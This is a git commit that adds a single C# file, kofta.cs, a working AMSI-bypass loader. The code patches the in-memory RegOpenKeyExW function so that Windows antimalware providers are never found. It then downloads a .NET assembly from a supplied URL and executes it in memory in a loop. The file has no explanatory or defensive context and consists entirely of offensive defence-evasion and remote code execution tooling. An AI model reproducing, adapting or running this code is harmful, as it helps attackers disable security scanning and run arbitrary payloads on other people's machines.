db8d142b92d4f905d5e6f061e60efc3d6e839c91
kofta0000 <mankofat0@gmail.com>
2025-05-29 00:21:51 +0300

    Create kofta.cs

---
+++ kofta.cs
@@ -0,0 +1,110 @@
+using System;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Linq;
+
+public static class TrollDisappearKey
+{
+
+    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);
+
+    static public int oldProtect;
+    static public IntPtr targetAddr, hookAddr;
+    static public byte[] originalBytes = new byte[12];
+    static public byte[] hookBytes = new byte[12];
+    static public int counter = 0;
+
+
+    public static void DisappearKey()
+    {
+        delegateRegOpenKeyExW A = RegOpenKeyWDetour;
+        targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
+        hookAddr = Marshal.GetFunctionPointerForDelegate(A);
+        Marshal.Copy(targetAddr, originalBytes, 0, 12);
+        hookBytes = new byte[] { 72, 184 }
+            .Concat(BitConverter.GetBytes((long)(ulong)hookAddr))
+            .Concat(new byte[] { 80, 195 })
+            .ToArray();
+        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
+        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
+    }
+
+    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
+    {
+        try
+        {
+            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);
+
+            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
+            {
+                counter = counter + 1;
+                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
+            }
+            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
+        }
+        finally
+        {
+            if (counter == 0)
+            {
+                Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
+            }
+        }
+    }
+
+    public static void Main(string[] args)
+    {
+        // Validate arguments count
+        if (args.Length < 2)
+        {
+            Console.WriteLine("Usage: TrollDisappearKey <url> <arguments>");
+            Console.WriteLine("Example: TrollDisappearKey \"https://example.com/mylib.dll\" \"arg1,arg2\"");
+            Console.WriteLine("To disable hook, pass 'disable' as second argument.");
+            return;
+        }
+
+        // Ignore TLS errors
+        ServicePointManager.Expect100Continue = true;
+        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+        // Call the function to install the hook which essentially makes lpSubKey disappear
+        // If first argument is passed as 'disable', hook will not trigger
+        if (args[1].Split(',')[0] != "disable")
+        {
+            DisappearKey();
+        }
+
+        // Standard assembly load .exe and call main with args
+        ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
+    }
+
+    public static void ExecuteAssembly(Byte[] assemblyBytes, string comma_separated_args)
+    {
+        Assembly assembly = Assembly.Load(assemblyBytes);
+        MethodInfo method = assembly.EntryPoint;
+
+        object[] parameters = new object[] { comma_separated_args.Split(',') };
+        string input = "";
+
+        while (input != "exit")
+        {
+            method.Invoke(null, parameters);
+            Console.Write("Pass in arguments comma delimited or type exit\r\n");
+            input = Console.ReadLine();
+            parameters = new object[] { input.Split(',') };
+        }
+    }
+}
